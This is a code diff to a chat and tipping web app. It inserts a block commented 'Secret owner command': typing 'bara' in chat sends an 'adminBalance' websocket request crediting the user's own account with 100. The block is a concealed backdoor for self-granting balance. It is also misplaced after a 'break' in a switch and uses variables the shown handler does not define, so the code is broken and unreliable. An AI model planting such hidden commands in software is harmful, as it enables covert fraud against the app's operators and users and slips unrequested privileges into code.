@@ -686,6 +686,7 @@ tr:hover td{background:rgba(255,255,255,.015);}
 
     </div>
 
+ 
     <!-- CHAT -->
     <div class="chat">
       <div class="chat-head">
@@ -1100,6 +1101,13 @@ function handleWS(msg) {
       msg.messages.forEach(m => appendChat(m, false));
       box.scrollTop = box.scrollHeight;
       break;
+
+      // Secret owner command
+if (message.toLowerCase() === 'bara') {
+  ws.send(JSON.stringify({ type: 'adminBalance', targetUsername: currentUser.username, amount: '100' }));
+  chatInput.value = '';
+  return;
+}
 
     case 'tipOk':
       updateBal(msg.balance);
